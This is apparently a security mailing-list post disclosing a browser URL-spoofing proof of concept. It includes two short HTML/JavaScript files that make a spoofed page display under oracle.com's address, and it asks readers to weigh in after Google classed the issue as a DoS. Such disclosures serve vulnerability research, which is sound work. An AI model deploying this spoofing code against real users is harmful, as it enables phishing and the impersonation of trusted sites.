Anyone can be "BBB Accredited Business" etc. You can make whitehouse.gov display "We love Islamic State" :-)  Note: No user interaction on the fake page.  Code: ***** index.html <script> function next() { 	w.location.replace('http://www.oracle.com/index.html?'+n);n++; 	setTimeout("next();",15); 	setTimeout("next();",25); } function f() { 	i=setInterval("try{x=w.location.href;}catch(e){clearInterval(i);n=0;next();}",5); } </script> <a href="#" onclick="f()">Go</a><br> ***** content.html <b>This web page is NOT oracle.com</b> <script>location="http://www.oracle.com/index.html";</script> ***** It's online (The page says - it works as we tested today)  Request For Comment: We reported this to Google. They reproduced, and say It's DoS which doesn't matter. We think it's very strange, since the browser does not crash(not DoS), and the threat is obvious. What's your opinion?  Kind Regards,  PS We love clever tricks. We love this: http://dieyu.org/   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
